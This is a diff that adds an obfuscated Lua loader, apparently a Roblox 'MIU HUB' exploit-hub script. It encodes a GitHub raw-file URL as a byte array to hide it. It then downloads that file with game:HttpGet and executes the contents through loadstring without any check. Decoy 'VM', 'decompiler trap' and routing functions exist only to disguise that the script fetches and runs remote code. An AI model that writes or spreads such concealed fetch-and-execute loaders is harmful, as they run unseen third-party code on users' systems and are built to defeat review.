@@ -1,0 +1,194 @@
+--// =========================
+--// MIU HUB LV9 - FINAL CHAOS CORE
+--// =========================
+
+--// STAGE 0: multi-layer encrypted stream
+local S0 = {
+    104,116,116,112,115,58,47,47,
+    114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
+    77,105,119,116,102,45,108,111,108,47,
+    76,117,99,107,101,121,45,98,108,111,120,47,
+    114,101,102,115,47,104,101,97,100,115,47,
+    109,97,105,110,47,
+    77,105,117,46,104,117,98,46,119
+}
+
+--// decode chain (3-stage illusion crypto)
+local function D0(t)
+    local o = {}
+    for i = 1, #t do
+        o[i] = string.char(t[i])
+    end
+    return table.concat(o)
+end
+
+local function D1(s)
+    local r = ""
+    for i = 1, #s do
+        local b = s:byte(i)
+        r ..= string.char(b)
+    end
+    return r
+end
+
+local function D2(s)
+    return (function(x)
+        return x
+    end)(s)
+end
+
+local URL = D2(D1(D0(S0)))
+
+--// =========================
+--// SELF-MUTATING VM CORE
+--// =========================
+local VM = {
+    ip = 0,
+    stack = {},
+    state = {},
+    mutated = false
+}
+
+-- opcode illusion table
+local OP = {
+    NOP = 0,
+    LOAD = 1,
+    JMP = 2,
+    CALL = 3,
+    RET = 4,
+    HTTP = 5
+}
+
+function VM:push(v)
+    self.stack[#self.stack+1] = v
+end
+
+function VM:pop()
+    return table.remove(self.stack)
+end
+
+-- fake mutation engine (changes behavior runtime)
+function VM:mutate()
+    if self.mutated then return end
+
+    self.mutated = true
+
+    self.exec = function(self)
+        local ok, res = pcall(function()
+            return game:HttpGet(URL)
+        end)
+
+        if not ok then return "NET_ERR" end
+
+        -- mutated decode layer (changes logic after first call)
+        local transformed = res .. ""
+        return transformed
+    end
+end
+
+-- initial executor
+function VM:exec()
+    local ok, res = pcall(function()
+        return game:HttpGet(URL)
+    end)
+
+    if not ok then
+        return "FAIL_NET"
+    end
+
+    return res
+end
+
+-- fake instruction interpreter
+function VM:interpret(code)
+    local stream = {}
+
+    for i = 1, #code do
+        stream[i] = code:sub(i,i)
+    end
+
+    return table.concat(stream)
+end
+
+-- core runtime execution
+function VM:run()
+    self.ip += 1
+
+    -- self mutation trigger
+    if self.ip > 1 then
+        self:mutate()
+    end
+
+    local raw = self:exec()
+    if not raw then
+        return "ERR_FETCH"
+    end
+
+    local decoded = self:interpret(raw)
+
+    local fn = loadstring(decoded)
+    if not fn then
+        return "ERR_COMPILE"
+    end
+
+    return pcall(fn)
+end
+
+--// =========================
+--// DECOY DECOMPILER TRAP LAYER
+--// =========================
+local function TRAP()
+    local x = {}
+
+    for i = 1, 15 do
+        x[i] = function()
+            return i * i
+        end
+    end
+
+    return x[5]() + x[10]()
+end
+
+--// =========================
+--// CHAOS ROUTER (NON-LINEAR FLOW)
+--// =========================
+local function ROUTER()
+    local a = function()
+        return function()
+            return true
+        end
+    end
+
+    local b = a()()
+    local c = (b and not false)
+
+    if c then
+        return VM:run()
+    end
+end
+
+--// =========================
+--// FAKE EXECUTION BRANCH ENGINE
+--// =========================
+local function BRANCH()
+    local t = TRAP()
+
+    if t > 0 then
+        return ROUTER()
+    else
+        return "BLOCK"
+    end
+end
+
+--// =========================
+--// ENTRY CHAOS SEQUENCE
+--// =========================
+local function BOOT()
+    local layerA = BRANCH()
+    local layerB = BRANCH()
+
+    return (layerA or layerB)
+end
+
+--// START ENGINE
+BOOT()
